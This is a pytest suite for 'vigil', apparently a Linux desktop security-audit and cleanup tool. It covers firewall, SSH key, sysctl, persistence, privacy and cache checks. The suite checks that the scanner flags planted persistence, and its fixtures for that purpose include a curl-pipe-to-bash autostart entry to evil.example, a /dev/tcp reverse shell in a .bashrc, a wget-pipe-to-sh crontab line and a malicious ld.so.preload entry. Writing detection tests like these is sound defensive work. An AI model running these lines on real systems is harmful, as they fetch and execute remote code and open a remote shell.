"""Tests for bin/vigil. Run with: python3 -m pytest tests -q

Every check runs against a fake filesystem under tmp_path: vigil.ROOT is the
prefix for /etc, /proc, /sys and /var, vigil.HOME is a fake home directory,
and systemctl / child processes are replaced with fakes.
"""
import base64
import importlib.machinery
import importlib.util
import json
import os
import re
import stat
import struct
import threading
import time
from pathlib import Path

import sys

import pytest

sys.dont_write_bytecode = True          # keep bin/ free of __pycache__
REPO = Path(__file__).resolve().parents[1]


def load_vigil():
    loader = importlib.machinery.SourceFileLoader("vigil", str(REPO / "bin" / "vigil"))
    spec = importlib.util.spec_from_loader("vigil", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def v(tmp_path, monkeypatch):
    mod = load_vigil()
    root = tmp_path / "root"
    home = tmp_path / "home"
    root.mkdir()
    home.mkdir(mode=0o700)
    mod.ROOT = str(root)
    mod.HOME = str(home)
    mod.USER = "alice"
    units = {}
    mod.UNITS = units

    def fake_systemctl(*args):
        if args[0] in ("is-active", "is-enabled"):
            return units.get((args[0], args[1]), "inactive" if args[0] == "is-active" else "disabled")
        return ""

    # Replace the memoised wrapper itself, so tests can change units mid-test.
    monkeypatch.setattr(mod, "systemctl", fake_systemctl)
    commands = {}
    mod.COMMANDS = commands

    def fake_run(argv, timeout=8, limit=0, on_line=None):
        key = tuple(argv)
        if key not in commands:
            return None, ""
        rc, out = commands[key]
        if on_line is not None and rc is not None:      # stream like the real run(): keep what on_line wants
            out = "".join(l + "\n" for l in out.splitlines() if on_line(l))
        return rc, out

    monkeypatch.setattr(mod, "run", fake_run)
    trusted = set()
    mod.TRUSTED = trusted
    monkeypatch.setattr(mod, "is_trusted_executable", lambda p: p in trusted)
    return mod


def put(path, text, mode=0o644):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    os.chmod(path, mode)
    return path


def sysfile(v, rel, text, mode=0o644):
    return put(v.ROOT + rel, text, mode)


def homefile(v, rel, text, mode=0o644):
    return put(os.path.join(v.HOME, rel), text, mode)


# --------------------------------------------------------------------------
# Safe file reading

def test_read_file_refuses_symlink(v, tmp_path):
    target = put(tmp_path / "secret", "x")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(v.Refused):
        v.read_file(str(link))
    assert v.read_file(str(link), follow=True) == b"x"


def test_read_file_does_not_hang_on_fifo(v, tmp_path):
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    done = []

    def go():
        try:
            v.read_file(str(fifo), follow=True)
        except v.Refused:
            done.append("refused")

    t = threading.Thread(target=go, daemon=True)
    t.start()
    t.join(3)
    assert done == ["refused"]


def test_read_file_rejects_oversize(v, tmp_path):
    p = put(tmp_path / "big", "a" * 101)
    with pytest.raises(v.Refused):
        v.read_file(str(p), limit=100)
    assert v.read_file(str(p), limit=101) == b"a" * 101


def test_read_file_missing_is_none(v, tmp_path):
    assert v.read_file(str(tmp_path / "nope")) is None


def test_clean_strips_controls_and_caps(v):
    s = v.clean("a\x1b[31mb‮c" + "x" * 500, 20)
    assert "\x1b" not in s and "‮" not in s and len(s) <= 20


# --------------------------------------------------------------------------
# Running commands (real subprocesses)

def test_run_rejects_relative_argv():
    mod = load_vigil()
    assert mod.run(["sh", "-c", "true"]) == (None, "")


def test_run_caps_output():
    mod = load_vigil()
    rc, out = mod.run(["/usr/bin/yes"], timeout=5, limit=1000)
    assert rc is None and out == ""


def test_run_times_out():
    mod = load_vigil()
    rc, _ = mod.run(["/usr/bin/sleep", "5"], timeout=0.5)
    assert rc is None


def test_run_ok():
    mod = load_vigil()
    assert mod.run(["/usr/bin/printf", "hi"]) == (0, "hi")


# --------------------------------------------------------------------------
# Harden checks

def ufw(v, enabled="yes", policy="DROP", active="active"):
    sysfile(v, "/etc/ufw/ufw.conf", "ENABLED=%s\n" % enabled)
    sysfile(v, "/etc/default/ufw", 'DEFAULT_INPUT_POLICY="%s"\n' % policy)
    sysfile(v, "/usr/bin/ufw", "")
    v.UNITS[("is-active", "ufw.service")] = active


def test_firewall_pass(v):
    ufw(v)
    assert v.check_firewall()["status"] == "pass"


def test_firewall_off(v):
    ufw(v, enabled="no", active="inactive")
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "firewall-on"


def test_firewall_accepting(v):
    ufw(v, policy="ACCEPT")
    assert v.check_firewall()["status"] == "warn"


def test_firewall_missing(v):
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "install-ufw"


def test_firewall_nftables_counts(v):
    v.UNITS[("is-active", "nftables.service")] = "active"
    assert v.check_firewall()["status"] == "pass"


def test_kernel_sysctl(v):
    for name, _, rec, _ in v.KERNEL_SYSCTLS:
        sysfile(v, "/proc/sys/" + name.replace(".", "/"), "%d\n" % rec)
    assert v.check_kernel_sysctl()["status"] == "pass"
    sysfile(v, "/proc/sys/kernel/kptr_restrict", "0\n")
    c = v.check_kernel_sysctl()
    assert c["status"] == "warn" and "kptr_restrict" in c["detail"] and c["fix"]["action"] == "sysctl-harden"


def test_kernel_sysctl_unreadable(v):
    assert v.check_kernel_sysctl()["status"] == "unknown"


def test_llmnr(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_llmnr()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nLLMNR=no\n")
    assert v.check_llmnr()["status"] == "pass"


def test_ssh_server_off(v):
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_dropin_wins(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config", "PasswordAuthentication yes\nPermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "fail"
    sysfile(v, "/etc/ssh/sshd_config.d/00-a.conf",
            "PermitRootLogin no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n")
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_ignores_match_blocks(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config",
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nMatch User bob\n  PermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "pass"


def ssh_string(b):
    return struct.pack(">I", len(b)) + b


def openssh_key(cipher=b"none", ktype=b"ssh-ed25519"):
    pub = ssh_string(ktype) + ssh_string(b"\x00" * 32)
    blob = (b"openssh-key-v1\x00" + ssh_string(cipher) + ssh_string(b"none" if cipher == b"none" else b"bcrypt")
            + ssh_string(b"") + struct.pack(">I", 1) + ssh_string(pub) + ssh_string(b"\x00" * 64))
    body = base64.b64encode(blob).decode()
    return "-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----\n" % body


def test_private_key_parser(v):
    assert v._private_key_state(openssh_key().encode())[:2] == (True, False)
    assert v._private_key_state(openssh_key(b"aes256-ctr").encode())[:2] == (True, True)
    assert v._private_key_state(openssh_key(ktype=b"sk-ssh-ed25519@openssh.com").encode())[:2] == (True, True)
    pem = "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nabc\n-----END RSA PRIVATE KEY-----\n"
    assert v._private_key_state(pem.encode())[:2] == (True, True)
    assert v._private_key_state(b"-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n")[:2] == (True, False)
    assert v._private_key_state(b"ssh-ed25519 AAAA user@host\n")[0] is False
    # Truncated or garbage blobs never raise.
    assert v._private_key_state(b"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END")[0] is True


def test_ssh_keys_statuses(v):
    assert v.check_ssh_keys()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o700)
    homefile(v, ".ssh/id_ed25519", openssh_key(b"aes256-ctr"), 0o600)
    homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    assert v.check_ssh_keys()["status"] == "pass"
    homefile(v, ".ssh/id_work", openssh_key(), 0o600)
    assert v.check_ssh_keys()["status"] == "warn"
    os.chmod(os.path.join(v.HOME, ".ssh/id_work"), 0o644)
    c = v.check_ssh_keys()
    assert c["status"] == "fail" and c["fix"]["action"] == "ssh-perms"


def test_fix_ssh_perms_only_touches_keys_and_never_follows_links(v, tmp_path):
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o755)
    key = homefile(v, ".ssh/id_ed25519", openssh_key(), 0o644)
    pub = homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    outside = put(tmp_path / "outside_key", openssh_key(), 0o644)
    os.symlink(outside, os.path.join(v.HOME, ".ssh", "linked"))
    res = v.run_fix("ssh-perms")
    assert res["ok"], res
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".ssh")).st_mode) == 0o700
    assert stat.S_IMODE(key.stat().st_mode) == 0o600
    assert stat.S_IMODE(pub.stat().st_mode) == 0o644
    assert stat.S_IMODE(outside.stat().st_mode) == 0o644


def test_fix_refuses_symlinked_ssh_dir(v, tmp_path):
    real = tmp_path / "elsewhere"
    real.mkdir(mode=0o755)
    os.symlink(real, os.path.join(v.HOME, ".ssh"))
    res = v.run_fix("ssh-perms")
    assert not res["ok"]
    assert stat.S_IMODE(real.stat().st_mode) == 0o755


def test_gnupg(v):
    assert v.check_gnupg()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".gnupg"), 0o755)
    os.chmod(os.path.join(v.HOME, ".gnupg"), 0o755)
    assert v.check_gnupg()["status"] == "warn"
    assert v.run_fix("gnupg-perms")["ok"]
    assert v.check_gnupg()["status"] == "pass"


def test_screen_lock(v):
    assert v.check_screen_lock()["status"] == "unknown"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    assert v.check_screen_lock()["status"] == "pass"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 3600}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    homefile(v, ".local/state/omarchy/indicators/stay-awake", "")
    c = v.check_screen_lock()
    assert c["status"] == "warn" and c["fix"]["action"] == "allow-idle"


def test_faillock(v):
    assert v.check_faillock()["status"] == "na"
    sysfile(v, "/etc/pam.d/system-auth",
            "auth required pam_faillock.so preauth silent deny=10 unlock_time=120\n")
    c = v.check_faillock()
    assert c["status"] == "pass" and "10" in c["summary"]
    sysfile(v, "/etc/pam.d/system-auth", "auth required pam_unix.so\n")
    assert v.check_faillock()["status"] == "warn"


def test_passwordless_sudo(v):
    assert v.check_passwordless_sudo()["status"] == "na"
    v.TRUSTED.add(v.ROOT + "/usr/bin/omarchy-sudo-passwordless")
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (0, "")
    assert v.check_passwordless_sudo()["status"] == "fail"
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (1, "")
    assert v.check_passwordless_sudo()["status"] == "pass"


def test_docker_group(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\ndocker:x:970:bob,alice\n")
    assert v.check_docker_group()["status"] == "warn"
    sysfile(v, "/etc/group", "docker:x:970:bob,alicex\n")
    assert v.check_docker_group()["status"] == "pass"


def test_updates(v):
    import time as _t
    today = _t.strftime("%Y-%m-%d")
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % today)
    assert v.check_updates()["status"] == "pass"
    sysfile(v, "/var/log/pacman.log", "[2020-01-01T10:00:00+0000] [PACMAN] starting full system upgrade\n")
    assert v.check_updates()["status"] == "fail"



def test_listeners_skip_loopback(v):
    tcp = ("  sl  local_address rem_address   st\n"
           "   0: 0100007F:0277 00000000:0000 0A\n"          # 127.0.0.1:631
           "   1: 3500007F:0035 00000000:0000 0A\n"          # 127.0.0.53:53
           "   2: 00000000:0016 00000000:0000 0A\n"          # 0.0.0.0:22
           "   3: 00000000:1F90 00000000:0000 01\n")         # established, ignored
    tcp6 = ("  sl  local_address rem_address st\n"
            "   0: 00000000000000000000000001000000:1F90 00000000000000000000000000000000:0000 0A\n"
            "   1: 00000000000000000000000000000000:D125 00000000000000000000000000000000:0000 0A\n")
    sysfile(v, "/proc/net/tcp", tcp)
    sysfile(v, "/proc/net/tcp6", tcp6)
    assert v._listeners() == [("tcp", 22), ("tcp", 53541)]
    c = v.check_listeners()
    assert c["status"] == "warn" and "22" in c["detail"]


# --------------------------------------------------------------------------
# Scan checks

def test_persistence_flags_download_and_run(v):
    homefile(v, ".bashrc", "# curl https://x | sh is fine in a comment\nalias ll='ls -l'\n")
    assert v.check_persistence()["status"] == "pass"
    homefile(v, ".config/autostart/updater.desktop",
             "[Desktop Entry]\nExec=sh -c 'curl -fsSL https://evil.example/x | bash'\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "autostart/updater.desktop:2" in c["detail"]


def test_persistence_follows_dotfile_symlink(v, tmp_path):
    real = put(tmp_path / "dotfiles" / "bashrc", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    os.symlink(real, os.path.join(v.HOME, ".bashrc"))
    assert v.check_persistence()["status"] == "warn"


def test_persistence_crontab(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/crontab")
    v.COMMANDS[("/usr/bin/crontab", "-l")] = (0, "*/5 * * * * wget -qO- http://x/y | sh\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "crontab:1" in c["detail"]


def test_ld_preload(v):
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "# comment\n")
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    assert v.check_ld_preload()["status"] == "fail"



# --------------------------------------------------------------------------
# Privacy checks

def test_dns_fallback(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_dns_fallback()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nFallbackDNS=\n")
    assert v.check_dns_fallback()["status"] == "pass"


def test_connectivity_and_mac(v):
    v.UNITS[("is-active", "NetworkManager.service")] = "active"
    sysfile(v, "/usr/lib/NetworkManager/conf.d/20-connectivity.conf",
            "[connectivity]\nuri=http://ping.archlinux.org/nm-check.txt\n")
    assert v.check_connectivity_check()["status"] == "info"
    sysfile(v, "/etc/NetworkManager/conf.d/90-x.conf", "[connectivity]\nenabled=false\n")
    assert v.check_connectivity_check()["status"] == "pass"
    assert v.check_mac_randomization()["status"] == "warn"
    sysfile(v, "/etc/NetworkManager/conf.d/91-x.conf", "[connection]\nwifi.cloned-mac-address=stable\n")
    assert v.check_mac_randomization()["status"] == "pass"


def test_avahi(v):
    assert v.check_avahi()["status"] == "pass"
    v.UNITS[("is-active", "avahi-daemon.service")] = "active"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\n#disable-publishing=no\n")
    assert v.check_avahi()["status"] == "warn"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\ndisable-publishing=yes\n")
    assert v.check_avahi()["status"] == "pass"


def test_optout_roundtrip(v):
    assert v.check_opt_out()["status"] == "info"
    assert v.run_fix("optout-on")["ok"]
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    assert path.read_text() == v.OPT_OUT_TEXT
    assert v.check_opt_out()["fix"]["action"] == "optout-off"
    assert v.run_fix("optout-off")["ok"]
    assert not path.exists()


def test_optout_off_leaves_edited_file(v):
    v.run_fix("optout-on")
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    path.write_text(v.OPT_OUT_TEXT + "export MINE=1\n")
    res = v.run_fix("optout-off")
    assert not res["ok"] and path.exists()


def test_optout_on_does_not_write_through_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".config/uwsm/env.d")
    d.mkdir(parents=True)
    os.symlink(victim, d / v.OPT_OUT_NAME)
    assert v.run_fix("optout-on")["ok"]
    assert victim.read_text() == "must survive"
    assert not (d / v.OPT_OUT_NAME).is_symlink()


# --------------------------------------------------------------------------
# Clean

def test_clean_thumbnails_stays_inside(v, tmp_path):
    keep = tmp_path / "keep"
    keep.mkdir()
    put(keep / "precious.png", "x")
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "large" / "a.png", "x")
    put(thumbs / "normal" / "b.png", "x")
    os.symlink(keep, thumbs / "escape")
    res = v.run_fix("clean-thumbnails")
    assert res["ok"], res
    assert (keep / "precious.png").exists()
    assert list(thumbs.iterdir()) == []


DAY = 86400


def aged(path, days):
    t = time.time() - days * DAY
    os.utime(path, (t, t), follow_symlinks=False)
    return path


def test_empty_trash_needs_no_desktop_session(v, tmp_path):
    outside = put(tmp_path / "outside.txt", "keep me")
    trash = Path(v.HOME, ".local/share/Trash")
    put(trash / "files" / "old.txt", "x")
    put(trash / "info" / "old.txt.trashinfo", "[Trash Info]")
    put(trash / "files" / "project" / "ro" / "obj", "x")
    os.chmod(trash / "files" / "project" / "ro", 0o555)          # e.g. a Go module folder
    os.symlink(outside, trash / "files" / "link")
    put(trash / "directorysizes", "1 2 project")
    res = v.run_fix("empty-trash")
    assert res["ok"] and res["message"] == "Trash emptied.", res
    assert list((trash / "files").iterdir()) == [] and list((trash / "info").iterdir()) == []
    assert not (trash / "directorysizes").exists()
    assert outside.read_text() == "keep me"
    assert v.check_trash()["status"] == "pass"


def test_clean_app_cache_keeps_what_is_in_use(v, tmp_path):
    outside = put(tmp_path / "outside.bin", "keep me")
    cache = Path(v.HOME, ".cache")
    old = aged(put(cache / "app" / "old.bin", "x" * 2_000_000), 10)
    new = put(cache / "app" / "new.bin", "x" * 2_000_000)
    stale_dir = put(cache / "gone" / "deep" / "f", "x" * 10)
    aged(stale_dir, 30); aged(stale_dir.parent, 30); aged(stale_dir.parent.parent, 30)
    thumb = aged(put(cache / "thumbnails" / "normal" / "t.png", "x"), 30)
    link = cache / "app" / "link"
    os.symlink(outside, link); aged(link, 30)
    aged(cache / "app", 30)
    c = v.check_user_cache()
    assert c["status"] == "info" and "not used in the past week" in c["summary"], c
    assert c["fix"]["action"] == "clean-app-cache"
    res = v.run_fix("clean-app-cache")
    assert res["ok"] and res["message"].startswith("Freed "), res
    assert not old.exists() and new.exists() and thumb.exists()
    assert not (cache / "gone").exists()
    assert not os.path.lexists(link) and outside.read_text() == "keep me"
    assert (cache / "app").exists()                                  # still holds new.bin
    assert v.check_user_cache()["status"] == "pass"


def test_clean_user_runs_every_no_root_cleanup(v):
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "normal" / "a.png", "x")
    put(Path(v.HOME, ".local/share/Trash/files/old.txt"), "x" * 5000)
    aged(put(Path(v.HOME, ".cache/app/old.bin"), "x" * 2_000_000), 10)
    res = v.run_fix("clean-user")
    assert res["ok"], res
    assert "Removed 1 thumbnail" in res["message"] and "Trash emptied" in res["message"]
    assert "Freed" in res["message"]
    assert list(thumbs.iterdir()) == []


def test_clean_user_on_a_tidy_home(v):
    res = v.run_fix("clean-user")
    assert res["ok"] and "trash" not in res["message"].lower() and "cache" not in res["message"].lower(), res


PACCACHE = "/usr/bin/paccache"


def test_pacman_cache_reports_what_can_be_freed(v):
    sysfile(v, "/var/cache/pacman/pkg/a-1-1-x86_64.pkg.tar.zst", "x" * 50000)
    assert "Could not work out" in v.check_pacman_cache()["summary"]          # no paccache
    v.TRUSTED.add(v.sys_path(PACCACHE))
    v.COMMANDS[(PACCACHE, "-d", "-k2", "--nocolor")] = (0, "\n==> no candidate packages found for pruning\n")
    v.COMMANDS[(PACCACHE, "-d", "-u", "-k0", "--nocolor")] = (
        0, "\n==> finished dry run: 3 candidates (disk space saved: 1.50 GiB)\n")
    c = v.check_pacman_cache()
    assert c["summary"].endswith("1.5 GB can be freed."), c
    assert c["fix"] == {"kind": "terminal", "action": "clean-pacman-cache", "label": "Free 1.5 GB"}
    v.COMMANDS[(PACCACHE, "-d", "-u", "-k0", "--nocolor")] = (0, "==> no candidate packages found for pruning")
    c = v.check_pacman_cache()
    assert c["status"] == "pass" and "kept for rollback" in c["summary"] and c["fix"]["kind"] == "none"


def test_size_checks(v):
    assert v.check_thumbnails()["status"] == "pass"
    put(Path(v.HOME, ".cache/thumbnails/normal/a.png"), "x" * 10000)
    c = v.check_thumbnails()
    assert c["status"] == "info" and c["fix"]["action"] == "clean-thumbnails"


def test_unknown_fix_refused(v):
    assert v.run_fix("rm-rf")["ok"] is False


# --------------------------------------------------------------------------
# State

def test_state_reports_new_findings_after_baseline(v):
    ufw(v, enabled="no", active="inactive")
    first = v.audit()
    assert first["stateSaved"] and first["new"] == []
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    second = v.audit()
    assert "ld-preload" in second["new"] and "firewall" not in second["new"]
    assert v.audit()["new"] == []
    st = os.stat(os.path.join(v.HOME, ".local/state/omarchy-vigil/state.json"))
    assert stat.S_IMODE(st.st_mode) == 0o600


def test_peek_does_not_touch_state(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil"))


def test_state_write_replaces_planted_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(victim, d / "state.json")
    v.audit()
    assert victim.read_text() == "must survive"


def test_state_refuses_symlinked_directory(v, tmp_path):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    Path(v.HOME, ".local/state").mkdir(parents=True)
    os.symlink(elsewhere, Path(v.HOME, ".local/state/omarchy-vigil"))
    report = v.audit()
    assert report["stateSaved"] is False
    assert list(elsewhere.iterdir()) == []


# --------------------------------------------------------------------------
# Report shape and the contract with Model.js

def model_actions():
    src = (REPO / "Model.js").read_text()
    terminal = set(re.findall(r'^  "([a-z0-9-]+)": \{\n    title:', src, re.M))
    helper = set(re.findall(r'"([a-z0-9-]+)"', re.search(r"var HELPER_ACTIONS = \[(.*?)\]", src, re.S).group(1)))
    return terminal, helper


def test_every_fix_in_helper_is_known_to_model(v):
    terminal, helper = model_actions()
    src = (REPO / "bin" / "vigil").read_text()
    used_terminal = set(re.findall(r'"terminal", "([a-z0-9-]+)"', src))
    used_helper = set(re.findall(r'"helper", "([a-z0-9-]+)"', src))
    used_app = set(re.findall(r'"app", "([a-z0-9-]+)"', src))
    msrc = (REPO / "Model.js").read_text()
    for a in used_app:
        assert '"%s": {\n    app:' % a in msrc, a
    for spec in v.SCANNERS:
        used_terminal |= {a for a in (spec[5], spec[6]) if a}
    assert used_terminal <= terminal, used_terminal - terminal
    assert used_helper <= helper, used_helper - helper
    assert helper == set(v.FIXES)


def test_full_audit_shape(v):
    report = v.audit()
    json.dumps(report)
    ids = [c["id"] for c in report["checks"]]
    assert len(ids) == len(set(ids)) and len(ids) <= 160
    for c in report["checks"]:
        assert re.fullmatch(r"[a-z0-9-]{1,40}", c["id"])
        assert c["category"] in ("harden", "detect", "supply", "privacy", "care")
        assert c["status"] in ("pass", "warn", "fail", "info", "na", "unknown")
        assert c["fix"]["kind"] in ("terminal", "helper", "app", "docs", "none")
        assert isinstance(c["weight"], int) and 0 <= c["weight"] <= 3
        assert len(c["summary"]) <= 240 and len(c["why"]) <= 400 and len(c["howto"]) <= 400
        # Every open finding has a button, and can be marked as reviewed.
        if c["status"] in ("warn", "fail", "info"):
            assert c["fix"]["kind"] != "none", c["id"]
        assert c["dismissible"] == (c["status"] not in ("pass", "na")), c["id"]
        if c["status"] == "unknown":
            assert c["howto"], c["id"]
    assert 0 <= report["score"] <= 100


def test_cli_rejects_bad_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["fix", "../../x"], ["fix"], ["audit", "--force"], []):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Pillars: ClamUI hand-off, Bumblebee, plugin inventory

def test_categories_match_pillars(v):
    cats = {c["category"] for c in v.audit(peek=True)["checks"]}
    assert cats == {"harden", "detect", "supply", "privacy", "care"}


def test_clamui_detection(v):
    c = v.check_clamui()
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "install-clamui", "label": "Install ClamUI"}
    v.TRUSTED.add(v.ROOT + "/usr/bin/flatpak")
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == "flatpak"
    c = v.check_clamui()
    assert c["status"] == "pass" and c["fix"]["kind"] == "app" and c["fix"]["action"] == "open-clamui"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.clamui_install() == "native"
    assert v.audit(peek=True)["apps"] == {"clamui": "native"}


def test_flatpak_clamui_needs_trusted_flatpak(v):
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == ""


def bumblebee(v, payload, raw=None):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID), exist_ok=True)
    homefile(v, ".local/state/omarchy/bumblebee/last-scan.json", raw if raw is not None else json.dumps(payload), 0o600)


def test_bumblebee_states(v):
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["weight"] == 0
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    assert v.check_bumblebee()["status"] == "unknown"
    bumblebee(v, {"ok": True, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "pass"
    bumblebee(v, {"ok": True, "exposure_count": 2})
    c = v.check_bumblebee()
    assert c["status"] == "fail" and "2 known-compromised" in c["summary"]
    bumblebee(v, {"ok": False, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "unknown"
    for bad in ({"ok": True, "exposure_count": True}, {"ok": True, "exposure_count": -1},
                {"ok": True, "exposure_count": "3"}, ["x"]):
        bumblebee(v, bad)
        assert v.check_bumblebee()["status"] == "unknown", bad
    bumblebee(v, None, raw="{not json")
    assert v.check_bumblebee()["status"] == "unknown"



def test_bumblebee_refuses_symlinked_cache(v, tmp_path):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    real = put(tmp_path / "fake.json", json.dumps({"ok": True, "exposure_count": 0}))
    d = Path(v.HOME, ".local/state/omarchy/bumblebee")
    d.mkdir(parents=True)
    os.symlink(real, d / "last-scan.json")
    assert v.check_bumblebee()["status"] == "unknown"


def test_bumblebee_oversized_cache(v):
    bumblebee(v, None, raw='{"ok": true, "exposure_count": 0, "pad": "' + "x" * 70000 + '"}')
    assert v.check_bumblebee()["status"] == "unknown"


def test_plugin_inventory(v):
    assert v.check_plugins()["status"] == "pass"
    base = os.path.join(v.HOME, ".config/omarchy/plugins")
    homefile(v, ".config/omarchy/plugins/acme.weather/manifest.json", json.dumps({"name": "<b>Weather</b>"}))
    homefile(v, ".config/omarchy/plugins/keasbeexd.vigil/manifest.json", json.dumps({"name": "Vigil"}))
    os.makedirs(os.path.join(base, "broken.plugin"))
    c = v.check_plugins()
    assert c["status"] == "info" and "2 third-party plugins" in c["summary"]
    assert "Vigil" not in c["detail"] and "acme.weather" in c["detail"] and "broken.plugin" in c["detail"]


# --------------------------------------------------------------------------
# Undo, reviewed warnings, score history

def test_etc_mark_matches_model(v):
    src = (REPO / "Model.js").read_text()
    assert 'var VIGIL_MARK = "%s"' % v.ETC_MARK in src


def test_undo_offered_only_for_vigil_owned_files(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    path = "/etc/systemd/resolved.conf.d/90-omarchy-vigil-llmnr.conf"
    sysfile(v, path, v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["status"] == "pass" and llmnr["undo"]["action"] == "undo-llmnr"
    sysfile(v, path, "# edited by hand\n" + v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["undo"]["action"] == ""


def test_undo_never_follows_symlink(v, tmp_path):
    real = put(tmp_path / "x.conf", "")
    real.write_text(v.ETC_MARK + "\n")
    os.makedirs(v.ROOT + "/etc/sysctl.d")
    os.symlink(real, v.ROOT + "/etc/sysctl.d/90-omarchy-vigil.conf")
    assert v.undo_available("undo-sysctl") is False


def test_sysctl_undo_shows_on_both_sysctl_checks(v):
    sysfile(v, "/etc/sysctl.d/90-omarchy-vigil.conf", v.ETC_MARK + "\nkernel.kptr_restrict=2\n")
    checks = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert checks["kernel-hardening"]["undo"]["action"] == "undo-sysctl"
    assert checks["network-hardening"]["undo"]["action"] == "undo-sysctl"


def test_avahi_undo_needs_backup(v):
    assert v.undo_available("undo-avahi") is False
    sysfile(v, v.AVAHI_BACKUP, "[publish]\n")
    assert v.undo_available("undo-avahi") is True


def port_listening(v):
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n")


def test_dismiss_warning_roundtrip(v):
    port_listening(v)
    before = v.audit()
    ports = {c["id"]: c for c in before["checks"]}["open-ports"]
    assert ports["status"] == "warn" and ports["dismissible"] and not ports["dismissed"]
    res = v.set_dismissed("open-ports", True)
    assert res["ok"], res
    after = v.audit()
